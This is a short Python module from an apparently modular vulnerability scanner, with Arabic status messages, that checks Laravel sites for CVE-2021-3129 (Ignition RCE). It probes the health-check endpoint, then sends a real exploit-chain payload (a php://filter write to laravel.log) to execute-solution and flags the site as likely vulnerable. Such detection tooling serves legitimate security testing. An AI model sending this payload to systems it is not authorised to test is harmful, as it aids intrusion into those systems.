# ignition.py — CVE-2021-3129
from core.registry import module
from core.http import get, req

@module("ignition", "laravel", "فحص CVE-2021-3129 (Ignition RCE)")
def run(base, a, R):
    st, _, b = get(base + "/_ignition/health-check")
    if st == 200 and "status" in b:
        R.info("Ignition مثبت — health-check يستجيب")
        st2, _, _ = req(base + "/_ignition/execute-solution", method="POST",
                        data='{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",'
                             '"parameters":{"variableName":"x","viewFile":"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"}}',
                        headers={"Content-Type": "application/json"})
        if st2 in (405, 404, 0):
            R.good("execute-solution غير متاح — الإصدار محدث (مستبعد)")
        else:
            R.vuln(f"execute-solution يستجيب HTTP {st2} — ثغرة CVE-2021-3129 محتملة! اختبر يدوياً")
    else:
        R.good("Ignition غير مكشوف")
